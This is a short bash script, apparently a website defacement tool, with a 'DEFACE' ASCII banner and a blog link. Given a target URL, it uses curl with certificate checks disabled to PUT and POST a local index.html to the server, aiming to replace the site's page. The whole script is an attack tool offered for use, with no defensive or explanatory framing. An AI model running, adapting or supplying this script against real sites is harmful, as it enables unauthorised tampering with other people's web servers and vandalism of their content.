#!/bin/bash

### Color ###
{
white='\e[1;37m'
red='\e[1;31m'
}

echo -e $red """
   ___  ____ ____ ____ ____ ____ 
   |  \ |___ |___ |__| |    |___ 
   |__/ |___ |    |  | |___ |___ 
                              
"""                                                                                      
echo -e $white"   https://cruznos.blogspot.com"
echo -e $white''
if [ -z "$1" ]; then
        echo "Usage Deface curl. "
        echo "Use: $0 <URL>"
        exit 0
fi

echo
curl -k -T index.html $1
curl -k -X POST -F index.html $1